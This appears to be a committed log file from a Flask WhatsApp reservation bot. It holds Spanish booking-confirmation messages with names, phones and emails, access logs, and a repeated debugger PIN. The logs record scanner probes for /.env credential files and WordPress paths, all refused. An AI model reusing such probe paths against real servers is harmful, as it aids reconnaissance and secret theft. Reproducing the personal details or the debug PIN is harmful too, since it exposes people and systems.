+Nombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_39'_para_rechazarla..
+Responde_'Confirmar_39'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_40*_
+Hoy_a_las_,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_40'_para_rechazarla..
+Responde_'Confirmar_40'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_41*_
+Mañana_a_las_,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_41'_para_rechazarla..
+Responde_'Confirmar_41'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_42*_
+
+Día_2022-10-27,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_42'_para_rechazarla..
+Responde_'Confirmar_42'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_43*_
+
+Día_2022-10-27_a_las_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juanafecha,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_43'_para_rechazarla..
+Responde_'Confirmar_43'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_44*_
+
+Mañana_a_las_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juanafecha,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_44'_para_rechazarla..
+Responde_'Confirmar_44'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_45*_
+
+Hoy_a_las_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juanafecha,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_45'_para_rechazarla..
+Responde_'Confirmar_45'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_46*_
+
+Hoy_25_a_las_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Alvarito,_tel:_099231211,_mail:_alva@gmail.com
+
+Responde_'Rechazar_46'_para_rechazarla..
+Responde_'Confirmar_46'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_47*_
+
+Mañana_26_a_las_11:00hs,_Cantidad_de_personas:_3
+Nombre:_benja,_Tel:_1244,_Email:_benja@benja.com
+
+Responde_'Rechazar_47'_para_rechazarla..
+Responde_'Confirmar_47'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_48*_
+
+Día_2022-10-30_a_las_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Pedro,_tel:_099231211,_mail:_pe@gmail.com
+
+Responde_'Rechazar_48'_para_rechazarla..
+Responde_'Confirmar_48'_para_confirmarla.
+Restaurant_montevideo._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_49*_
+
+Día_3333-03-04_a_las_09:34hs,_Cantidad_de_personas:_5
+Nombre:_Paulina,_tel:_09598439,_mail:_crespipauli@gmail.com
+
+Responde_'Rechazar_49'_para_rechazarla..
+Responde_'Confirmar_49'_para_confirmarla.
+Restaurant_montevideo._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_50*_
+
+Día__a_las_hs,_Cantidad_de_personas:_2
+Nombre:_Maria,_tel:_092391725,_mail:_Fabinimaria@gmail.com
+
+Responde_'Rechazar_50'_para_rechazarla..
+Responde_'Confirmar_50'_para_confirmarla.
+Restaurant_montevideo._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_51*_
+
+Día__a_las_hs,_Cantidad_de_personas:_2
+Nombre:_Maria,_tel:_092391725,_mail:_Fabinimaria@gmail.com
+
+Responde_'Rechazar_51'_para_rechazarla..
+Responde_'Confirmar_51'_para_confirmarla.127.0.0.1 - - [26/Oct/2022 01:15:20] "GET /send-message?msg=Restaurant_montevideo._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_51*_%0A%0ADía__a_las_hs,_Cantidad_de_personas:_2%0ANombre:_Maria,_tel:_092391725,_mail:_Fabinimaria@gmail.com%0A%0AResponde_'Rechazar_51'_para_rechazarla..%0AResponde_'Confirmar_51'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [26/Oct/2022 01:15:21] "GET /send-message?msg=Restaurant_montevideo._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_52*_%0A%0ADía__a_las_hs,_Cantidad_de_personas:_2%0ANombre:_Maria,_tel:_092391725,_mail:_Fabinimaria@gmail.com%0A%0AResponde_'Rechazar_52'_para_rechazarla..%0AResponde_'Confirmar_52'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [26/Oct/2022 01:26:42] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [26/Oct/2022 01:26:46] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [26/Oct/2022 01:26:49] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [26/Oct/2022 01:27:07] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 01:27:08] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:42:58] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [26/Oct/2022 01:42:58] "[33mGET /.env HTTP/1.0[0m" 404 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/confirm_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/app.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/confirm_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+127.0.0.1 - - [26/Oct/2022 01:45:20] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 01:45:21] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 01:45:21] "[33mGET /wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:21] "[33mGET /xmlrpc.php?rsd HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:22] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 01:45:22] "[33mGET /blog/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:22] "[33mGET /web/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:23] "[33mGET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:23] "[33mGET /website/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:23] "[33mGET /wp/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:24] "[33mGET /news/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:24] "[33mGET /2020/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:24] "[33mGET /2019/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:25] "[33mGET /shop/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:25] "[33mGET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:25] "[33mGET /test/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:26] "[33mGET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:26] "[33mGET /site/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:27] "[33mGET /cms/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:45:27] "[33mGET /sito/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:52:05] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 01:55:04] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 02:01:35] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 02:01:36] "POST / HTTP/1.0" 200 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/app.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+127.0.0.1 - - [26/Oct/2022 02:04:04] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [26/Oct/2022 02:04:04] "[33mGET /.env HTTP/1.0[0m" 404 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+127.0.0.1 - - [26/Oct/2022 02:06:35] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [26/Oct/2022 02:12:43] "[31m[1mGET / HTTP/1.0[0m" 405 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+127.0.0.1 - - [26/Oct/2022 02:33:32] "[31m[1mGET / HTTP/1.0[0m" 405 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+127.0.0.1 - - [26/Oct/2022 02:34:38] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 02:34:38] "POST / HTTP/1.0" 200 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+127.0.0.1 - - [26/Oct/2022 02:50:14] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [26/Oct/2022 02:50:14] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 02:51:09] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 03:04:10] "[33mGET /log/login-page.php HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 03:04:12] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 03:07:42] "[33mGET /.env HTTP/1.0[0m" 404 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/awaiting_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/confirm_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/decline_message.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
